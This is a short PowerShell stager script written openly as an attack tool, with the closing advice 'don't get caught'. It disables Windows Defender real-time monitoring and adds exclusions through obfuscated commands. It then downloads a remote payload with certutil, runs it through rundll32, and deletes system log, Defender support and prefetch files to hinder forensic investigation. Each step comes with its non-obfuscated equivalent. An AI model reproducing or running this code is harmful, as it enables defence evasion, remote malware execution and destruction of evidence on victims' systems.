
# stager should be created with the following powershell command
# Opens powershell with script block bypass in a hidden window 
# powershell.exe -NoPr -WINd 1 -eXEc ByP 

# change variable of location of remote file
$ABABAB = "https://sitename"

# change variable
$ACACAC = "$file.exe"

# Disables Defender Real Time Monitoring 
#non-obfuscated command: Invoke-Command -ComputerName %s -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Add-MpPreference -ExclusionProcess '%s' }

InVOKe-cOMMAnd -"coMputEr"NaME %s -s"c"R"i"Ptb"l"O"c"k { s"Et-Mpp"RE"Fe"R"ENcE" -"dI"SA"bLe"Re"AL"T"i"m"eMo"Ni"TORI"Ng $T"Ru"E; ad"D"-"mPP"R"e"Fe"R"Ence -"Exc"L"usI"O"N"P"AtH" 'C:\'; aD"D-"M"PPrEfE"REnce -e"x"C"l"u"s"I"oN"p"r"o"C"ESs '%s' }

Start-Sleep -Seconds 5

# uses certutil  lolbas to load payload 
# non-obfuscated command certutil.exe -urlcache -f $ABABAB $ACACAC
cerTuTIl.Exe -Ur"Lcac"HE -f $ABABAB $ACACAC

# Adjust this sleep to approximate time of Download
Start-Sleep -Seconds 300

# Executes file using rundll32 lolbas 
# non-obfuscated command rundll32.exe url.dll,FileProtocolHandler $ACACAC
rUNDll32.EXe uRl.DLl,fIlEpROTOcolhaNdleR $ACACAC

# Adjust this sleep to approximate time of execution
Start-Sleep -Seconds 500


# Deletes traces and makes forensics more difficult - may need to delete again depending on the application functionality
del /f /q %SystemRoot%\System32\LogFiles\*.*
del /f /q C:\ProgramData\Microsoft\Windows Defender\Support\*.*
del /f /q C:\Windows\Prefetch\*.*

#My goal is create 3 stages: the stager to bypass Execution Policy, the payload, and a full cleanup script. more to come soon.
# Remove Comments. Enjoy and don't get caught


